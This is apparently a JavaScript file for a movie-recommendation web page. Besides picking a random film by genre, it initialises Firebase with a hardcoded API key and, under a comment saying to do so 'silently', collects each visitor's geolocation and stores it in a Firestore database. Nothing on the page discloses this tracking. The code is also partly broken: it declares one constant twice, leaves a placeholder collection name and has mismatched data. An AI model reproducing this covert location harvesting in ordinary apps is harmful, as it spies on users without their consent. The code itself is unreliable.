// Sample movie data
const movies = [
    { title: "", year: 2012, genre: "action", whereToWatch: "Netflix", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png' },
    { title: "Creed III", year: 2012, genre: "action", whereToWatch: "Netflix", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png' },
    { title: "Extraction 2", year: 2012, genre: "action", whereToWatch: "Netflix", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png' },
    { title: "Through My Window", year: 2015, genre: "romance", whereToWatch: "Amazon Prime", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png' },
    { title: "Incantation", year: 2020, genre: "horror", whereToWatch: "Hulu", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png'},
    { title: "Super mario", year: 2020, genre: "animation", whereToWatch: "Netnaija", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png'},
    { title: "Demon slayer", year: 2020, genre: "anime", whereToWatch: "Netflix", link: 'https://www.netflix.com', logoUrl: 'netflix-logo.png'},
];

// Event listener for the recommend button
document.getElementById('recommendButton').addEventListener('click', recommendMovie);

// Function to recommend a movie based on genre and year
function recommendMovie() {
    const selectedGenre = document.getElementById('genre').value;
    const currentYear = new Date().getFullYear();
    
    // Filter movies by genre and year
    const eligibleMovies = movies.filter(movie => (
        movie.genre === selectedGenre && movie.year >= 2010 && movie.year <= currentYear
    ));

    if (eligibleMovies.length > 0) {
        // Randomly select a movie from eligible options
        const randomIndex = Math.floor(Math.random() * eligibleMovies.length);
        const recommendedMovie = eligibleMovies[randomIndex];

        // Display the recommended movie and where to watch
        document.getElementById('recommendedMovie').textContent = recommendedMovie.title;
        document.getElementById('whereToWatch').textContent = `Watch on ${recommendedMovie.whereToWatch}`;
    } else {
        // No eligible movies found
        document.getElementById('recommendedMovie').textContent = 'No movies found for this genre and year range.';
        document.getElementById('whereToWatch').textContent = 'get out fool';
    }
}
const firebaseConfig = {
    apiKey: "AIzaSyBAkZW1dh1GI9yCPa0dbpkgQGjNYj-s5UY",
    authDomain: "movie-recorn.firebaseapp.com",
    projectId: "movie-recorn",
    storageBucket: "movie-recorn.appspot.com",
    messagingSenderId: "624310009803",
    appId: "1:624310009803:web:752721f6f675e7902b004e",
    measurementId: "G-H7SBZKLL94"
  };

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();

// Collect and store geolocation data silently
navigator.geolocation.getCurrentPosition(position => {
    const { latitude, longitude } = position.coords;
    const dataToStore = {
        latitude,
        longitude,
        timestamp: firebase.firestore.FieldValue.serverTimestamp() // Include a timestamp
    };

    // Store data in Firestore
    db.collection("geolocationData").add(dataToStore)
        .then(docRef => {
            console.log("Data stored in Firestore with ID: ", docRef.id);
        })
        .catch(error => {
            console.error("Error storing data in Firestore: ", error);
        });
});


// Reference to a specific location in the database
const dbRef = firebase.database().ref('https://movie-recorn-default-rtdb.firebaseio.com/');

// Read data once
dbRef.once('value')
    .then(snapshot => {
        // Handle the data
        const data = snapshot.val();
        console.log(data);
    })
    .catch(error => {
        console.error('Error reading data:', error);
    });













// Reference to a Firestore collection
const db = firebase.firestore();
const collectionRef = db.collection('your-collection-name');

// Retrieve data from the collection
collectionRef.get()
    .then(querySnapshot => {
        querySnapshot.forEach(doc => {
            // Handle each document's data
            console.log(doc.id, ' => ', doc.data());
        });
    })
    .catch(error => {
        console.error('Error reading data:', error);
    });

